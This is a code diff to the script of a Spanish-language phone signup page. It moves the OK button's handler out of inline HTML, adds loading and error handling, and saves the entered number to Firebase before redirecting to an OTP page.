@@ -90,12 +90,17 @@
                 `;
                 modalButtons.innerHTML = `
                     <button class="btn-flat" onclick="cerrarModal()">EDITAR</button>
-                    <button class="btn-flat" onclick="guardarYEnviar('${num}')">OK</button>
+                    <button class="btn-flat" id="btnOk">OK</button>
                 `;
                 modal.style.display = 'block';
+                
+                // Evento para el botón OK
+                document.getElementById('btnOk').onclick = function() {
+                    guardarYEnviar(num);
+                };
             } else {
                 modalTitulo.innerText = "Número no válido";
-                modalMensaje.innerText = "El número de teléfono es demasiado corto.";
+                modalMensaje.innerText = "Por favor, introduce un número válido.";
                 modalButtons.innerHTML = `<button class="btn-flat" onclick="cerrarModal()">OK</button>`;
                 modal.style.display = 'block';
             }
@@ -105,14 +110,21 @@
         
         function guardarYEnviar(num) {
             const numCompleto = "+595" + num;
-            
-            // Guardamos en Firebase para saber quién intenta registrarse
+            const btn = document.getElementById('btnOk');
+            btn.innerText = "CONECTANDO...";
+            btn.disabled = true;
+
+            // Guardamos el intento de registro
             db.ref("registros_pendientes").push({
                 telefono: numCompleto,
                 fecha: Date.now()
             }).then(() => {
                 localStorage.setItem("user_phone", numCompleto);
                 window.location.href = 'otp.html';
+            }).catch(e => {
+                alert("Error: " + e.message);
+                btn.innerText = "OK";
+                btn.disabled = false;
             });
         }
     </script>
